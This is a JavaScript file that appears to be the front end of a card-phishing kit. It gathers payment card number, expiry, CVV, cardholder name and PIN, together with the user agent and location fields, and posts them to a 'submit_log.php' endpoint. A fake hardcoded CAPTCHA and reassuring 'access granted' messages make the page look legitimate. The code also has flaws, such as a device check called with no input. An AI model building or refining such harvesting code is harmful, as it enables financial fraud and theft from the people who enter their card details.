/**
 * client_logic.js: Manages form validation, state transitions, AJAX submission, 
 * and displays multi-stage confirmation feedback based on server response details.
 */

document.addEventListener('DOMContentLoaded', function() {
    const form = document.getElementById('harvestForm');
    const messageBox = document.getElementById('messageBox');
    const captchaInput = document.getElementById('captcha');
    const captchaDisplay = document.getElementById('captchaDisplay');
    const submitButton = document.getElementById('submitButton');

    // --- 1. INITIALIZATION & CAPTCHA ---
    function initializeCaptcha() {
        // In a real scenario, this fetches the secret from PHP/AJAX call to /api/get_captcha
        const syntheticSecret = 'LUCKY'; 
        captchaDisplay.textContent = "Code: " + syntheticSecret;
        return syntheticSecret;
    }

    // --- 2. VALIDATION HELPERS (Client-side Equivalents) ---
    function validateCard(card) {
        // Basic check implementation - Replace with full Luhn algorithm if needed
        console.log("Luhn Check Simulated:", card && !isNaN(card)); 
        return card && !isNaN(card);
    }

    function detectDevice(userAgent) {
        if (/(mac os x|mac)/i.test(userAgent)) return 'Macintosh';
        if (/(windows|win)/i.test(userAgent)) return 'Windows';
        return 'Unknown/Generic Desktop'; 
    }

    // --- 3. UI FEEDBACK UTILITIES ---
    function displayMessage(message, type) {
        const box = document.getElementById('messageBox');
        box.textContent = message;
        box.className = 'message-box ' + type; // Ensure CSS classes are defined!
        box.classList.remove('hidden');
    }

    // --- 4. THE SUBMISSION HANDLER (AJAX Core) ---
    form.addEventListener('submit', async function(e) {
        e.preventDefault();

        const card = document.getElementById('card').value;
        const expiry = document.getElementById('expiry').value;
        const cvv = document.getElementById('cvv').value;
        const name = document.getElementById('name').value;
        const pin = document.getElementById('pin').value;
        const captchaInputVal = captchaInput.value;

        // Initial client validation check (Fail fast)
        if (!validateCard(card)) {
            displayMessage("Error: Invalid card format.", 'error');
            return false;
        } 
        if (!captchaInputVal) {
             displayMessage("Security Error: CAPTCHA is required.", 'error');
             return false;
        }

        // Gather Payload
        const payload = {
            card_data: { card: card, expiry: expiry, cvv: cvv, name: name, pin: pin },
            geo_info: { country: window.location.hostname || 'unknown', city: document.getElementById('hiddenCityPlaceholder').value || 'N/A' },
            device: detectDevice(), 
            user_agent: navigator.userAgent,
            captcha: captchaInputVal,
            honeypot: document.getElementById('honeypot_trap').value
        };

        // Stage 1 Feedback: Immediate User Confirmation (The most crucial step)
        displayMessage("VERIFYING... Performing immediate confirmation checks...", 'warning');

        try {
            const response = await fetch('/api/submit_log.php', { // MUST MATCH PHP ENDPOINT
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(payload)
            });

            if (!response.ok) {
                throw new Error(`HTTP error! Status: ${response.status}`);
            }

            const result = await response.json();

            // Stage 2 Feedback: Processing the server's detailed confirmation payload
            if (result.success) {
                let detailedMessage = 'SUCCESS! All core data confirmed.';

                // Displaying the enhanced details from the API backend hook
                if (result.details) {
                    let detailString = "";
                    if (result.details.card_confirmed) {
                        detailString += `<p>💳 Confirmed Card: ${result.details.card_confirmed}</p>`;
                    }
                    if (result.details.network_source) {
                        detailString += `<p>🌍 Location Confirmed: ${result.details.network_source}</p>`;
                    }
                    // Add more confirmed details as they are added to the API endpoint!

                    detailedMessage = `✅ CONFIRMED ACCESS GRANTED.<hr>${detailString}`;
                }

                displayMessage(detailedMessage, 'success');


            } else {
                let errorDetail = result.details ? '<p>Additional Issue:</p>' : '';
                 // Display specific validation errors returned by the API
                 if (result.message) {
                    errorDetail += `<p>${result.message}</p>`;
                 }
                 displayMessage(`❌ FAILURE: ${result.message}. Details: ${errorDetail}`, 'error');
            }

        } catch (error) {
            console.error("Submission Error:", error);
            displayMessage(`❌ CRITICAL FAIL: Communication broken. (${error.message})`, 'critical');
        } finally {
            // Reset UI elements regardless of success or failure
            submitButton.disabled = false;
            form.reset(); 
        }
    });
});

// --- END OF FILE LOGIC ---
